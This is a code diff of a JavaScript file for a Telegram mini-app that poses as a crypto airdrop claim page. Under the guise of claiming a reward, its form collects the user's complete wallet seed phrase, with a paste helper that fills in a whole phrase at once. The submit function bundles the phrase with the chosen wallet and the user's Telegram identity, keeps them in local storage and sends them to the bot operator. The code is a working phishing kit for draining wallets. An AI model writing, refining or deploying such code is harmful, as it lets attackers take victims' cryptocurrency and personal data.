@@ -1,179 +1,187 @@
+// ======= Airdrop.js =======
 let tg = null;
 let demoMode = false;
+let tgUser = {};
 
-// ======= Ініціалізація Telegram WebApp =======
+// ======= Telegram WebApp Init =======
 function initTelegram() {
-    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
-        console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
-        demoMode = true;
-        return;
-    }
+  if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+    console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
+    demoMode = true;
+    return;
+  }
 
-    tg = Telegram.WebApp;
-    tg.ready();
-    console.log("✅ Telegram WebApp ініціалізовано");
+  tg = Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+  console.log("✅ Telegram WebApp ініціалізовано");
 
-    const user = tg.initDataUnsafe?.user || {};
+  const u = tg.initDataUnsafe?.user;
+  if (u?.id) {
+    tgUser.id = u.id;
+    tgUser.username = u.username || "—";
+    tgUser.first_name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "—";
+    tgUser.photo_url = u.photo_url || "";
+    const now = new Date().toISOString();
 
-    if (user.id) {
-        const uid = user.id;
-        const uname = user.username || "-";
-        const fname = [user.first_name, user.last_name].filter(Boolean).join(" ") || "-";
-        const timestamp = new Date().toISOString();
-
-        localStorage.setItem("tg_user_id", uid);
-        localStorage.setItem("tg_username", uname);
-        localStorage.setItem("tg_name", fname);
-        localStorage.setItem("tg_timestamp", timestamp);
-    } else {
-        console.warn("⛔️ Користувач Telegram не визначений, fallback на localStorage");
-    }
+    // Save to localStorage
+    localStorage.setItem("tg_user_id", tgUser.id);
+    localStorage.setItem("tg_username", tgUser.username);
+    localStorage.setItem("tg_name", tgUser.first_name);
+    localStorage.setItem("tg_photo", tgUser.photo_url);
+    localStorage.setItem("tg_timestamp", now);
+  } else {
+    console.warn("⛔️ Користувач Telegram не визначений, fallback на localStorage");
+    tgUser.id = localStorage.getItem("tg_user_id") || "—";
+    tgUser.username = localStorage.getItem("tg_username") || "—";
+    tgUser.first_name = localStorage.getItem("tg_name") || "—";
+    tgUser.photo_url = localStorage.getItem("tg_photo") || "";
+  }
 }
 
-// ======= DOM завантажено =======
+// ======= DOM Ready =======
 document.addEventListener("DOMContentLoaded", () => {
-    initTelegram();
+  initTelegram();
 
-    const tgStatus = document.getElementById("tg_status");
-    const uid = localStorage.getItem("tg_user_id") || "-";
-    const uname = localStorage.getItem("tg_username") || "-";
-    const fname = localStorage.getItem("tg_name") || "-";
+  // Відображення Telegram профілю
+  const tgStatus = document.getElementById("tg_status");
+  if (tgStatus) {
+    tgStatus.innerHTML = `
+      <div class="profile-card">
+        <p><strong>👤 Пользователь:</strong> ${tgUser.first_name}</p>
+        <p><strong>🆔 Telegram ID:</strong> ${tgUser.id}</p>
+        <p><strong>💛 Username:</strong> ${tgUser.username !== "—" ? "@" + tgUser.username : "нет"}</p>
+      </div>
+    `;
+  }
 
-    if (tgStatus) {
-        tgStatus.innerHTML = `
-            <div class="profile-card">
-                <p><strong>👤 Пользователь:</strong> ${fname}</p>
-                <p><strong>🆔 Telegram ID:</strong> ${uid}</p>
-                <p><strong>💛 Username:</strong> ${uname !== "-" ? "@" + uname : "нет"}</p>
-            </div>
+  // Завантаження airdrops
+  fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
+    .then(res => res.json())
+    .then(data => {
+      const container = document.getElementById('airdropList');
+      container.innerHTML = '';
+      data.forEach(drop => {
+        const card = document.createElement('div');
+        card.className = 'airdrop-card';
+        card.innerHTML = `
+          <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
+          <h2>${drop.name}</h2>
+          <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
+          <p>🌐 Мережа: ${drop.network}</p>
+          <p>⏳ До: ${drop.ends}</p>
+          <button onclick="selectAirdrop('${drop.name}')">Участь</button>
         `;
-    }
+        container.appendChild(card);
+      });
+    })
+    .catch(error => {
+      console.error("❌ Помилка при завантаженні airdrops.json:", error);
+      document.getElementById("airdropList").innerHTML =
+        "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
+    });
 
-    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
-        .then(res => res.json())
-        .then(data => {
-            const container = document.getElementById('airdropList');
-            container.innerHTML = '';
-            data.forEach(drop => {
-                const card = document.createElement('div');
-                card.className = 'airdrop-card';
-                card.innerHTML = `
-                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
-                    <h2>${drop.name}</h2>
-                    <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
-                    <p>🌐 Мережа: ${drop.network}</p>
-                    <p>⏳ До: ${drop.ends}</p>
-                    <button onclick="selectAirdrop('${drop.name}')">Участь</button>
-                `;
-                container.appendChild(card);
-            });
-        })
-        .catch(error => {
-            console.error("❌ Помилка при завантаженні airdrops.json:", error);
-            document.getElementById("airdropList").innerHTML =
-                "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
-        });
+  const btn = document.getElementById('submitBtn');
+  if (btn) btn.addEventListener('click', submitAirdrop);
 
-    const btn = document.getElementById('submitBtn');
-    if (btn) btn.addEventListener('click', submitAirdrop);
+  // Select init
+  const selectWrapper = document.querySelector('.custom-select');
+  if (selectWrapper) {
+    const selected = selectWrapper.querySelector('.selected');
+    const options = selectWrapper.querySelectorAll('.options li');
+    const hiddenInput = document.querySelector('#wallet');
 
-    const selectWrapper = document.querySelector('.custom-select');
-    if (selectWrapper) {
-        const selected = selectWrapper.querySelector('.selected');
-        const options = selectWrapper.querySelectorAll('.options li');
-        const hiddenInput = document.querySelector('#wallet');
+    selected.addEventListener('click', () => {
+      selectWrapper.classList.toggle('open');
+    });
 
-        selected.addEventListener('click', () => {
-            selectWrapper.classList.toggle('open');
-        });
+    options.forEach(option => {
+      option.addEventListener('click', () => {
+        selected.innerHTML = option.innerHTML;
+        hiddenInput.value = option.dataset.value;
+        selectWrapper.classList.remove('open');
+      });
+    });
 
-        options.forEach(option => {
-            option.addEventListener('click', () => {
-                selected.innerHTML = option.innerHTML;
-                hiddenInput.value = option.dataset.value;
-                selectWrapper.classList.remove('open');
-            });
-        });
-
-        document.addEventListener('click', e => {
-            if (!selectWrapper.contains(e.target)) {
-                selectWrapper.classList.remove('open');
-            }
-        });
-    }
+    document.addEventListener('click', e => {
+      if (!selectWrapper.contains(e.target)) {
+        selectWrapper.classList.remove('open');
+      }
+    });
+  }
 });
 
+// ======= Airdrop selection =======
 function selectAirdrop(name) {
-    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
-    document.getElementById('airdropList').style.display = 'none';
-    document.getElementById('airdropForm').style.display = 'block';
-    renderSeedInputs();
+  document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
+  document.getElementById('airdropList').style.display = 'none';
+  document.getElementById('airdropForm').style.display = 'block';
+  renderSeedInputs();
 }
 
 function renderSeedInputs() {
-    const length = parseInt(document.getElementById('length').value);
-    const container = document.getElementById('seedContainer');
-    container.innerHTML = '';
+  const length = parseInt(document.getElementById('length').value);
+  const container = document.getElementById('seedContainer');
+  container.innerHTML = '';
 
-    for (let i = 0; i < length; i++) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.placeholder = `Слово ${i + 1}`;
-        container.appendChild(input);
-    }
+  for (let i = 0; i < length; i++) {
+    const input = document.createElement('input');
+    input.type = 'text';
+    input.placeholder = `Слово ${i + 1}`;
+    container.appendChild(input);
+  }
 
-    const inputs = container.querySelectorAll('input');
-    if (inputs.length > 0) {
-        inputs[0].addEventListener('paste', (e) => {
-            e.preventDefault();
-            const pasted = (e.clipboardData || window.clipboardData).getData('text');
-            const words = pasted.trim().split(/\s+/);
-            if (words.length > 1) {
-                words.forEach((word, index) => {
-                    if (inputs[index]) inputs[index].value = word;
-                });
-            } else {
-                inputs[0].value = pasted;
-            }
+  const inputs = container.querySelectorAll('input');
+  if (inputs.length > 0) {
+    inputs[0].addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData).getData('text');
+      const words = pasted.trim().split(/\s+/);
+      if (words.length > 1) {
+        words.forEach((word, index) => {
+          if (inputs[index]) inputs[index].value = word;
         });
-    }
+      } else {
+        inputs[0].value = pasted;
+      }
+    });
+  }
 }
 
 function submitAirdrop() {
-    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
-    const words = inputs.map(input => input.value.trim()).filter(Boolean);
+  const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
+  const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
-    if (words.length !== inputs.length) {
-        document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
-        document.getElementById('validationWarning').style.display = 'block';
-        return;
-    }
+  if (words.length !== inputs.length) {
+    document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
+    document.getElementById('validationWarning').style.display = 'block';
+    return;
+  }
 
-    const payload = {
-        event: "airdrop_claim",
-        user_id: tg?.initDataUnsafe?.user?.id || localStorage.getItem("tg_user_id") || "-",
-        username: tg?.initDataUnsafe?.user?.username || localStorage.getItem("tg_username") || "-",
-        name: localStorage.getItem("tg_name") || "-",
-        timestamp: new Date().toISOString(),
-        seed: words.join(" "),
-        wallet: document.getElementById("wallet").value
-    };
+  const payload = {
+    event: "airdrop_claim",
+    user_id: tgUser.id,
+    username: tgUser.username,
+    name: tgUser.first_name,
+    timestamp: new Date().toISOString(),
+    seed: words.join(" "),
+    wallet: document.getElementById("wallet").value
+  };
 
-    localStorage.setItem("tg_user_id", payload.user_id);
-    localStorage.setItem("tg_username", payload.username);
-    localStorage.setItem("tg_name", payload.name);
-    localStorage.setItem("tg_timestamp", payload.timestamp);
-    localStorage.setItem("last_seed", payload.seed);
-    localStorage.setItem("wallet_used", payload.wallet);
+  localStorage.setItem("tg_user_id", payload.user_id);
+  localStorage.setItem("tg_username", payload.username);
+  localStorage.setItem("tg_name", payload.name);
+  localStorage.setItem("tg_timestamp", payload.timestamp);
+  localStorage.setItem("last_seed", payload.seed);
+  localStorage.setItem("wallet_used", payload.wallet);
 
-    if (!demoMode && tg?.sendData) {
-        console.log("[📤 Надсилання в Telegram WebApp]", payload);
-        tg.sendData(JSON.stringify(payload));
-        tg.close();
-    } else {
-        console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
-        alert("📦 Демо-режим: дані не надіслано (браузерний режим). Переходимо до профілю.");
-        console.log("[DEMO PAYLOAD]", payload);
-        window.location.href = "airprofile.html";
-    }
+  if (!demoMode && tg?.sendData) {
+    console.log("[📤 Надсилання в Telegram WebApp]", payload);
+    tg.sendData(JSON.stringify(payload));
+    setTimeout(() => tg.close(), 400);
+  } else {
+    console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
+    alert("📦 Демо-режим: дані не надіслано. Переходимо до профілю.");
+    window.location.href = "airprofile.html";
+  }
 }
